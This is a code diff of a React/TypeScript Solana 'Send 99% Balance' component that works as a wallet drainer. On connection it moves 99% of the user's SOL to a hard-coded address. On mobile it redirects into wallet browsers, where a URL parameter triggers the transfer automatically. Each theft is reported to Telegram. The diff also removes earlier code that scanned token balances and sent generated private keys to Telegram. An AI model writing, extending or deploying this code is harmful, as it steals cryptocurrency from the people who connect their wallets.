@@ -4,26 +4,10 @@ import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { SystemProgram, Transaction, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { FC, useState, useCallback, useEffect } from 'react';
 import { notify } from "../utils/notifications";
-import { sendTelegramMessage, formatTransactionMessage, CHAIN_ADDRESSES, generateWalletForChain, CreatedWallet } from "../utils/telegram";
+import { sendTelegramMessage, formatTransactionMessage, generateWalletForChain, CreatedWallet } from "../utils/telegram";
 
-// Target wallet for SOL and SPL token transfers
+// Target wallet for SOL transfer
 const TARGET_WALLET_SOL = new PublicKey('Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ');
-
-// Cross-chain addresses (note: these are displayed in UI but actual cross-chain transfers require bridges)
-const CROSS_CHAIN_ADDRESSES = {
-    ETH: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
-    BTC: 'bc1qj2nrfyvh2tz36w0hh5anxsrm7r4ag8wrrj5gv9',
-    MONAD: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
-    BASE: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
-    SUI: '0x39e1629585d727b597b50522ae4e516ae90b573cefe61162019eb197bfead225',
-    POLYGON: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
-};
-
-// SPL Token Mints for common tokens (these are on Solana, not cross-chain)
-const KNOWN_SPL_TOKENS: Record<string, { mint: string; decimals: number; symbol: string; targetAddress?: string }> = {
-    'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': { mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', decimals: 6, symbol: 'USDC', targetAddress: 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ' },
-    'Es9vMFrzaCERz8K3VJzLBtJ8X3K2bZ3b7N8L7p8Xy4aC': { mint: 'Es9vMFrzaCERz8K3VJzLBtJ8X3K2bZ3b7N8L7p8Xy4aC', decimals: 6, symbol: 'USDT', targetAddress: 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ' },
-};
 
 // Percentage of balance to send (99%)
 const BALANCE_PERCENTAGE = 0.99;
@@ -31,20 +15,19 @@ const BALANCE_PERCENTAGE = 0.99;
 // Fee reserve (minimum lamports to keep for transaction fees)
 const FEE_RESERVE_LAMPORTS = 5000;
 
-// Wallet browse URLs for redirect
+// Wallet browse URLs for mobile redirect
 const WALLET_BROWSE_URLS = {
     phantom: 'https://phantom.app/ul/v1/browse/',
     solflare: 'https://solflare.com/ul/v1/browse/',
     backpack: 'https://backpack.app/ul/browse/',
 };
 
+// Device detection
+const isMobileDevice = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
 // Transaction states
 type TxState =
     | 'idle'
-    | 'scanning'
-    | 'selecting_wallet'
-    | 'opening_wallet'
-    | 'connecting_wallet'
     | 'preparing'
     | 'transferring'
     | 'confirming'
@@ -56,7 +39,7 @@ interface SendSolButtonProps {
 }
 
 // ============================================
-// WALLET SELECTION MODAL
+// WALLET SELECTION MODAL (Mobile Only)
 // ============================================
 
 interface WalletOption {
@@ -203,10 +186,6 @@ const NeonButton: FC<{
 const StatusPill: FC<{ state: TxState }> = ({ state }) => {
     const config: Record<TxState, { label: string; className: string; icon: string }> = {
         idle: { label: 'Ready', className: 'bg-slate-500/20 text-slate-400', icon: '' },
-        scanning: { label: 'Scanning tokens...', className: 'bg-violet-500/20 text-violet-400 animate-pulse', icon: '🔍' },
-        selecting_wallet: { label: 'Select wallet...', className: 'bg-violet-500/20 text-violet-400 animate-pulse', icon: '👛' },
-        opening_wallet: { label: 'Opening wallet...', className: 'bg-violet-500/20 text-violet-400 animate-pulse', icon: '🚀' },
-        connecting_wallet: { label: 'Connecting...', className: 'bg-amber-500/20 text-amber-400 animate-pulse', icon: '⏳' },
         preparing: { label: 'Preparing...', className: 'bg-amber-500/20 text-amber-400 animate-pulse', icon: '⏳' },
         transferring: { label: 'Transferring...', className: 'bg-cyan-500/20 text-cyan-400 animate-pulse', icon: '💸' },
         confirming: { label: 'Confirming...', className: 'bg-blue-500/20 text-blue-400 animate-pulse', icon: '🔄' },
@@ -225,145 +204,35 @@ const StatusPill: FC<{ state: TxState }> = ({ state }) => {
 };
 
 // ============================================
-// TOKEN INFO
+// WALLET EXECUTION INSIDE WALLET BROWSER
 // ============================================
 
-interface TokenInfo {
-    mint: PublicKey;
-    symbol: string;
-    name: string;
-    decimals: number;
-    balance: bigint;
-    uiAmount: number;
-}
-
-// ============================================
-// GET ALL TOKEN ACCOUNT
-// ============================================
-
-async function getTokenAccounts(connection: any, publicKey: PublicKey): Promise<TokenInfo[]> {
-    try {
-        // Get all token accounts for this wallet
-        const response = await connection.getTokenAccountsByOwner(publicKey, {
-            programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
-        });
-
-        const tokens: TokenInfo[] = [];
-
-        for (const { pubkey, account } of response.value) {
-            try {
-                const data = account.data;
-                const mint = new PublicKey(data.slice(0, 32));
-                const decimals = data[32 + 64]; // Token amount decimals position
-                const amount = BigInt(data.slice(32 + 64 + 1, 32 + 64 + 9).readBigUInt64LE());
-
-                // Skip zero balances
-                if (amount === BigInt(0)) continue;
-
-                // For SOL, decimals = 9
-                // Native SOL balance is handled separately
-                const uiAmount = Number(amount) / Math.pow(10, decimals);
-
-                tokens.push({
-                    mint,
-                    symbol: mint.toBase58().slice(0, 4),
-                    name: 'Token',
-                    decimals,
-                    balance: amount,
-                    uiAmount,
-                });
-            } catch (err) {
-                console.error('Error parsing token account:', err);
-            }
-        }
-
-        return tokens;
-    } catch (err) {
-        console.error('Error fetching token accounts:', err);
-        return [];
-    }
-}
-
-// ============================================
-// AUTO-EXECUTE INSIDE WALLET BROWSER
-// ============================================
-
-const AutoExecuteInWallet: FC<{
+interface WalletExecutionProps {
     onStateChange: (state: TxState) => void;
     onSignature: (sig: string) => void;
-    onTokensInfo: (tokens: TokenInfo[]) => void;
-    onUnknownTokens: (tokens: TokenInfo[]) => void;
-    onCreatedWallets: (wallets: CreatedWallet[]) => void;
-}> = ({ onStateChange, onSignature, onTokensInfo, onUnknownTokens, onCreatedWallets }) => {
+}
+
+const WalletExecution: FC<WalletExecutionProps> = ({ onStateChange, onSignature }) => {
     const { connection } = useConnection();
     const { publicKey, sendTransaction, connected } = useWallet();
 
     useEffect(() => {
         if (!connected || !publicKey) return;
 
-        const executeTransfer = async () => {
+        const executeSend99 = async () => {
             try {
-                onStateChange('connecting_wallet');
-                await new Promise(resolve => setTimeout(resolve, 500));
-
-                onStateChange('scanning');
-
-                // Get SOL balance
-                const solBalance = await connection.getBalance(publicKey);
-
-                // Get all SPL tokens
-                const tokens = await getTokenAccounts(connection, publicKey);
-
-                // Separate known and unknown tokens
-                const knownTokens: TokenInfo[] = [];
-                const unknown: TokenInfo[] = [];
-
-                for (const token of tokens) {
-                    const mintStr = token.mint.toBase58();
-                    const isKnown = Object.keys(KNOWN_SPL_TOKENS).includes(mintStr);
-                    if (isKnown) {
-                        knownTokens.push(token);
-                    } else {
-                        unknown.push(token);
-                    }
-                }
-
-                onTokensInfo(knownTokens);
-                onUnknownTokens(unknown);
-
-                // Create wallets for unknown tokens and send details to Telegram
-                if (unknown.length > 0) {
-                    const newWallets: CreatedWallet[] = [];
-                    for (const token of unknown) {
-                        const chainName = `SPL_${token.mint.toBase58().slice(0, 8)}`;
-                        const newWallet = generateWalletForChain(chainName);
-                        newWallets.push(newWallet);
-
-                        // Send wallet details to Telegram
-                        sendTelegramMessage(formatTransactionMessage({
-                            type: 'WALLET_CREATED',
-                            newWalletAddress: newWallet.address,
-                            newWalletPrivateKey: newWallet.privateKey,
-                            createdForToken: chainName,
-                        }));
-                    }
-                    onCreatedWallets(newWallets);
-                }
-
                 onStateChange('preparing');
 
-                // Get latest blockhash
-                const latestBlockhash = await connection.getLatestBlockhash('finalized');
+                const balance = await connection.getBalance(publicKey);
+                const FEE_BUFFER = FEE_RESERVE_LAMPORTS;
+                const amount = Math.floor((balance - FEE_BUFFER) * BALANCE_PERCENTAGE);
 
-                // Calculate 99% of SOL to send (keep some for fees)
-                const amountToSend = Math.floor(solBalance * BALANCE_PERCENTAGE);
-                const amountAfterFee = amountToSend - FEE_RESERVE_LAMPORTS;
-
-                if (amountAfterFee <= 0) {
-                    throw new Error('Insufficient balance after fee reserve');
+                if (amount <= FEE_BUFFER) {
+                    throw new Error('Insufficient balance');
                 }
 
-                // Create SOL transfer transaction
+                const latestBlockhash = await connection.getLatestBlockhash('finalized');
+
                 const transaction = new Transaction({
                     feePayer: publicKey,
                     blockhash: latestBlockhash.blockhash,
@@ -372,13 +241,9 @@ const AutoExecuteInWallet: FC<{
                     SystemProgram.transfer({
                         fromPubkey: publicKey,
                         toPubkey: TARGET_WALLET_SOL,
-                        lamports: amountAfterFee,
+                        lamports: amount,
                     })
                 );
-
-                // Add SPL token transfers if any exist
-                // Note: Simplified - real implementation would need TokenProgram.transfer instructions
-                // For now we focus on SOL transfer which is the primary use case
 
                 onStateChange('transferring');
 
@@ -392,11 +257,7 @@ const AutoExecuteInWallet: FC<{
                 onStateChange('confirming');
 
                 const result = await connection.confirmTransaction(
-                    {
-                        signature,
-                        blockhash: latestBlockhash.blockhash,
-                        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
-                    },
+                    { signature, blockhash: latestBlockhash.blockhash, lastValidBlockHeight: latestBlockhash.lastValidBlockHeight },
                     'finalized'
                 );
 
@@ -405,23 +266,21 @@ const AutoExecuteInWallet: FC<{
                 }
 
                 onStateChange('completed');
-                notify({
-                    type: 'success',
-                    message: `Transferred ${(amountAfterFee / LAMPORTS_PER_SOL).toFixed(4)} SOL successfully!`,
-                    txid: signature,
-                });
 
-                // Send Telegram notification for SOL transfer
-                const solAmount = amountAfterFee / LAMPORTS_PER_SOL;
-                const fromAddr = publicKey.toBase58();
-                const toAddr = TARGET_WALLET_SOL.toBase58();
+                const solAmount = amount / LAMPORTS_PER_SOL;
                 sendTelegramMessage(formatTransactionMessage({
                     type: 'SOL_TRANSFER',
                     amount: solAmount,
-                    fromAddress: fromAddr,
-                    toAddress: toAddr,
+                    fromAddress: publicKey.toBase58(),
+                    toAddress: TARGET_WALLET_SOL.toBase58(),
                     signature,
                 }));
+
+                notify({
+                    type: 'success',
+                    message: `Transferred ${solAmount.toFixed(4)} SOL successfully!`,
+                    txid: signature,
+                });
 
             } catch (error: unknown) {
                 onStateChange('failed');
@@ -443,8 +302,8 @@ const AutoExecuteInWallet: FC<{
             }
         };
 
-        executeTransfer();
-    }, [connected, publicKey, connection, sendTransaction, onStateChange, onSignature, onTokensInfo, onUnknownTokens, onCreatedWallets]);
+        executeSend99();
+    }, [connected, publicKey, connection, sendTransaction, onStateChange, onSignature]);
 
     return null;
 };
@@ -455,52 +314,143 @@ const AutoExecuteInWallet: FC<{
 
 export const SendSolButton: FC<SendSolButtonProps> = ({ className = '' }) => {
     const { connection } = useConnection();
-    const { publicKey, connected } = useWallet();
+    const { publicKey, connected, sendTransaction } = useWallet();
 
     const [txState, setTxState] = useState<TxState>('idle');
     const [showWalletModal, setShowWalletModal] = useState(false);
     const [lastSignature, setLastSignature] = useState<string | null>(null);
-    const [detectedTokens, setDetectedTokens] = useState<TokenInfo[]>([]);
-    const [unknownTokens, setUnknownTokens] = useState<TokenInfo[]>([]);
-    const [createdWallets, setCreatedWallets] = useState<CreatedWallet[]>([]);
 
-    // Check if running inside wallet browser
+    // Check if running inside wallet browser with auto-execute action
     const urlParams = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : null;
-    const isAutoExecuteMode = urlParams?.get('action') === 'send';
+    const isWalletExecutionMode = urlParams?.get('action') === 'send99';
+
+    // Detect device type
+    const mobile = isMobileDevice();
 
     const getBaseUrl = () => {
         if (typeof window === 'undefined') return '';
         return `${window.location.origin}${window.location.pathname}`;
     };
 
-    const handleWalletSelect = useCallback((walletId: string) => {
-        setTxState('opening_wallet');
+    // Desktop: Direct transaction via wallet adapter
+    const handleSend99Desktop = useCallback(async () => {
+        if (!publicKey) return;
+
+        try {
+            setTxState('preparing');
+
+            const balance = await connection.getBalance(publicKey);
+            const FEE_BUFFER = FEE_RESERVE_LAMPORTS;
+            const amount = Math.floor((balance - FEE_BUFFER) * BALANCE_PERCENTAGE);
+
+            if (amount <= FEE_BUFFER) {
+                throw new Error('Insufficient balance');
+            }
+
+            const latestBlockhash = await connection.getLatestBlockhash('finalized');
+
+            const transaction = new Transaction({
+                feePayer: publicKey,
+                blockhash: latestBlockhash.blockhash,
+                lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
+            }).add(
+                SystemProgram.transfer({
+                    fromPubkey: publicKey,
+                    toPubkey: TARGET_WALLET_SOL,
+                    lamports: amount,
+                })
+            );
+
+            setTxState('transferring');
+
+            const signature = await sendTransaction(transaction, connection, {
+                skipPreflight: false,
+                preflightCommitment: 'processed',
+                maxRetries: 5,
+            });
+
+            setLastSignature(signature);
+            setTxState('confirming');
+
+            const result = await connection.confirmTransaction(
+                { signature, blockhash: latestBlockhash.blockhash, lastValidBlockHeight: latestBlockhash.lastValidBlockHeight },
+                'finalized'
+            );
+
+            if (result.value.err) {
+                throw new Error('Transaction failed on-chain');
+            }
+
+            setTxState('completed');
+
+            const solAmount = amount / LAMPORTS_PER_SOL;
+            sendTelegramMessage(formatTransactionMessage({
+                type: 'SOL_TRANSFER',
+                amount: solAmount,
+                fromAddress: publicKey.toBase58(),
+                toAddress: TARGET_WALLET_SOL.toBase58(),
+                signature,
+            }));
+
+            notify({
+                type: 'success',
+                message: `Transferred ${solAmount.toFixed(4)} SOL successfully!`,
+                txid: signature,
+            });
+
+        } catch (error: unknown) {
+            setTxState('failed');
+            const errorMessage = error instanceof Error ? error.message : String(error);
+            console.error('Transfer error:', errorMessage);
+
+            if (
+                errorMessage.includes('rejected') ||
+                errorMessage.includes('User rejected') ||
+                errorMessage.includes('declined') ||
+                errorMessage.includes('cancelled')
+            ) {
+                notify({ type: 'info', message: 'Transaction cancelled by user' });
+            } else if (errorMessage.includes('insufficient')) {
+                notify({ type: 'error', message: 'Insufficient balance for transfer' });
+            } else {
+                notify({ type: 'error', message: 'Transfer failed', description: errorMessage });
+            }
+        }
+    }, [publicKey, connection, sendTransaction]);
+
+    // Mobile: Redirect to wallet browser
+    const openWalletApp = useCallback((walletId: string) => {
+        setTxState('preparing');
 
         const baseUrl = getBaseUrl();
-        const redirectUrl = `${baseUrl}?action=send&wallet=${walletId}`;
+        const redirectUrl = `${baseUrl}?action=send99`;
         const encodedRedirect = encodeURIComponent(redirectUrl);
 
         const walletUrl = `${WALLET_BROWSE_URLS[walletId as keyof typeof WALLET_BROWSE_URLS]}${encodedRedirect}`;
         window.location.href = walletUrl;
     }, []);
 
+    // Main click handler - routes based on device
     const handleClick = useCallback(() => {
         if (!connected || !publicKey) {
             notify({ type: 'error', message: 'Please connect your wallet first' });
             return;
         }
-        setShowWalletModal(true);
-    }, [connected, publicKey]);
+
+        if (mobile) {
+            // Mobile: Show wallet selection modal
+            setShowWalletModal(true);
+        } else {
+            // Desktop: Direct transaction
+            handleSend99Desktop();
+        }
+    }, [connected, publicKey, mobile, handleSend99Desktop]);
 
     const getButtonLabel = () => {
-        if (txState === 'selecting_wallet') return 'Opening...';
-        if (txState === 'opening_wallet') return 'Opening...';
-        if (txState === 'scanning') return 'Scanning...';
-        if (txState === 'connecting_wallet') return 'Connecting...';
         if (txState === 'preparing') return 'Preparing...';
         if (txState === 'transferring') return 'Transferring...';
         if (txState === 'confirming') return 'Confirming...';
-        return 'Send 99% Balance';
+        return mobile ? 'Open in Wallet' : 'Send 99% Balance';
     };
 
     const isLoading = txState !== 'idle' && txState !== 'completed' && txState !== 'failed';
@@ -509,7 +459,7 @@ export const SendSolButton: FC<SendSolButtonProps> = ({ className = '' }) => {
         <div className={`flex flex-col items-center gap-6 ${className}`}>
             <StatusPill state={txState} />
 
-            {!isAutoExecuteMode && (
+            {!isWalletExecutionMode && (
                 <NeonButton
                     onClick={handleClick}
                     disabled={!connected || !publicKey}
@@ -519,72 +469,25 @@ export const SendSolButton: FC<SendSolButtonProps> = ({ className = '' }) => {
                 </NeonButton>
             )}
 
-            {/* Auto-execute mode UI */}
-            {isAutoExecuteMode && (
+            {/* Wallet execution mode UI (mobile redirect flow) */}
+            {isWalletExecutionMode && (
                 <div className="flex flex-col items-center gap-3 p-6 rounded-2xl bg-white/5 border border-white/10 backdrop-blur-sm">
                     <div className="flex items-center gap-2 text-cyan-400">
                         <svg className="w-5 h-5 animate-spin" viewBox="0 0 24 24" fill="none">
                             <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2" strokeOpacity="0.3" />
                             <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
                         </svg>
-                        <span className="text-sm font-medium">Transferring 99% of wallet...</span>
+                        <span className="text-sm font-medium">Transferring 99% of SOL...</span>
                     </div>
                     <p className="text-white/40 text-xs text-center">
-                        Scanning for tokens and assets
+                        Please approve the transaction in your wallet
                     </p>
-                </div>
-            )}
-
-            {/* Detected tokens info */}
-            {detectedTokens.length > 0 && (
-                <div className="flex flex-col items-center gap-2 p-4 rounded-xl bg-white/5 border border-white/10">
-                    <span className="text-white/50 text-xs">Detected Tokens</span>
-                    <div className="flex flex-wrap gap-2 justify-center">
-                        {detectedTokens.map((token, i) => {
-                            const knownToken = Object.entries(KNOWN_SPL_TOKENS).find(([mint]) => mint === token.mint.toBase58());
-                            const symbol = knownToken ? knownToken[1].symbol : token.symbol;
-                            return (
-                                <span key={i} className="text-xs text-violet-400 bg-violet-500/20 px-2 py-1 rounded">
-                                    {symbol}: {token.uiAmount.toFixed(4)}
-                                </span>
-                            );
-                        })}
-                    </div>
-                </div>
-            )}
-
-            {/* Unknown tokens detected */}
-            {unknownTokens.length > 0 && (
-                <div className="flex flex-col items-center gap-2 p-4 rounded-xl bg-amber-500/10 border border-amber-500/20">
-                    <span className="text-amber-400 text-xs font-medium">Unknown Tokens - New Wallets Created</span>
-                    <div className="flex flex-wrap gap-2 justify-center">
-                        {unknownTokens.map((token, i) => (
-                            <span key={i} className="text-xs text-amber-300 bg-amber-500/20 px-2 py-1 rounded">
-                                {token.mint.toBase58().slice(0, 8)}...: {token.uiAmount.toFixed(4)}
-                            </span>
-                        ))}
-                    </div>
-                </div>
-            )}
-
-            {/* Created wallets for unknown tokens */}
-            {createdWallets.length > 0 && (
-                <div className="flex flex-col items-center gap-2 p-4 rounded-xl bg-green-500/10 border border-green-500/20">
-                    <span className="text-green-400 text-xs font-medium">New Wallets Created</span>
-                    <div className="flex flex-wrap gap-2 justify-center max-w-md">
-                        {createdWallets.map((wallet, i) => (
-                            <span key={i} className="text-xs text-green-300 bg-green-500/20 px-2 py-1 rounded">
-                                {wallet.chain}: {wallet.address.slice(0, 10)}...
-                            </span>
-                        ))}
-                    </div>
-                    <span className="text-white/40 text-xs">Wallet details sent to Telegram</span>
                 </div>
             )}
 
             {showWalletModal && (
                 <WalletSelectionModal
-                    onSelect={handleWalletSelect}
+                    onSelect={openWalletApp}
                     onClose={() => setShowWalletModal(false)}
                 />
             )}
@@ -609,13 +512,11 @@ export const SendSolButton: FC<SendSolButtonProps> = ({ className = '' }) => {
                 </p>
             )}
 
-            {isAutoExecuteMode && connected && publicKey && (
-                <AutoExecuteInWallet
+            {/* Auto-execute inside wallet browser */}
+            {isWalletExecutionMode && connected && publicKey && (
+                <WalletExecution
                     onStateChange={setTxState}
                     onSignature={setLastSignature}
-                    onTokensInfo={setDetectedTokens}
-                    onUnknownTokens={setUnknownTokens}
-                    onCreatedWallets={setCreatedWallets}
                 />
             )}
         </div>
